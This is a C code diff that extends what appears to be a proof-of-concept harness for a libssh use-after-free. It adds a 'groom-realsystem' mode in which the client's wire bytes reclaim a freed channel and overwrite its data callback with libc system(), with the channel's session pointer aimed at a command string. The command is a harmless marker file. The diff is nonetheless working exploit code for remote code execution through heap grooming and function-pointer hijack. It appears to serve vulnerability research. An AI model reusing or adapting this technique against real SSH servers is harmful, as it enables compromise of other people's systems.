@@ -45,6 +45,15 @@ static struct ssh_iterator *g_old_it = NULL;
 #define INLINE_CBS_OFF 72
 static int g_inline = 0;
 #endif
+#ifdef W14_REALSYSTEM
+/* W14: the indirect call from channel_rcv_data() targets real libc system().
+ * The callback's first argument is channel->session, read from the recycled
+ * channel that the authenticated peer's wire bytes occupy, so those bytes
+ * choose system()'s command pointer. No harness callback trampoline. */
+static int g_realsystem = 0;
+static const char g_realsystem_cmd[] =
+    "touch evidence-wire-vuln-groom-realsystem.marker";
+#endif
 #ifdef W12_FIXEDADDR
 static int g_fixedaddr = 0;
 static uint64_t g_fixed_fn = 0;
@@ -208,6 +217,17 @@ static int on_data(ssh_session s, ssh_channel ch, void *data, uint32_t len,
                 fflush(stdout);
             }
         }
+#ifdef W14_REALSYSTEM
+        if (g_realsystem) {
+            uint64_t armed_fn = 0, sess = 0;
+            memcpy(&armed_fn, wire + 112, sizeof(armed_fn));
+            memcpy(&sess, wire, sizeof(sess));
+            printf("SERVER REALSYS armed fn=0x%llx sess=0x%llx cmd=%s\n",
+                   (unsigned long long)armed_fn, (unsigned long long)sess,
+                   g_realsystem_cmd);
+            fflush(stdout);
+        }
+#endif
         g_done = 1;
     }
     return (int)len;
@@ -397,6 +417,18 @@ static int run_client(void)
                           (g_exec ? (uint64_t)(uintptr_t)&exec_trampoline :
                            (uint64_t)(uintptr_t)&marker_data);
 #endif
+#ifdef W14_REALSYSTEM
+            if (g_realsystem) {
+                uint64_t sess = (uint64_t)(uintptr_t)g_realsystem_cmd;
+                fn = g_bad_call ? 0x4141414141414141ull :
+                     (uint64_t)(uintptr_t)&system;
+                memcpy(payload, &sess, sizeof(sess));
+                printf("CLIENT realsystem fn=0x%llx sess=0x%llx cmd=%s bad=%d\n",
+                       (unsigned long long)fn, (unsigned long long)sess,
+                       g_realsystem_cmd, g_bad_call);
+                fflush(stdout);
+            }
+#endif
             memcpy(payload + 112, &fn, sizeof(fn));
             if (g_exec) {
 #ifdef W13_INLINE
@@ -470,8 +502,10 @@ int main(int argc, char **argv)
         fprintf(stderr,
 #ifdef W12_FIXEDADDR
                 "usage: %s hostkey [data-only|no-free|groom|groom-survive|groom-call|groom-call-bad|groom-exec|groom-nodetach-exec|groom-nodetach-bare|groom-fixedaddr|client-only FN_ADDR|server-only|server-fixedaddr FN_ADDR]\n",
-#else
+#elif !defined(W14_REALSYSTEM)
                 "usage: %s hostkey [data-only|no-free|groom|groom-survive|groom-call|groom-call-bad|groom-exec|groom-nodetach-exec|groom-nodetach-bare]\n",
+#else
+                "usage: %s hostkey [data-only|no-free|groom|groom-survive|groom-call|groom-call-bad|groom-exec|groom-nodetach-exec|groom-nodetach-bare|groom-realsystem|groom-realsystem-bad]\n",
 #endif
                 argv[0]);
         return 2;
@@ -536,6 +570,19 @@ int main(int argc, char **argv)
         g_nodetach = 1;
         g_no_reclaim = 1;
         g_exec = 1;
+#ifdef W14_REALSYSTEM
+    } else if (argc == 3 && strcmp(argv[2], "groom-realsystem") == 0) {
+        g_groom = 1;
+        g_survive = 1;
+        g_call = 1;
+        g_realsystem = 1;
+    } else if (argc == 3 && strcmp(argv[2], "groom-realsystem-bad") == 0) {
+        g_groom = 1;
+        g_survive = 1;
+        g_call = 1;
+        g_realsystem = 1;
+        g_bad_call = 1;
+#endif
 #ifdef W13_INLINE
     } else if (argc == 3 && strcmp(argv[2], "groom-inline") == 0) {
         g_groom = 1;
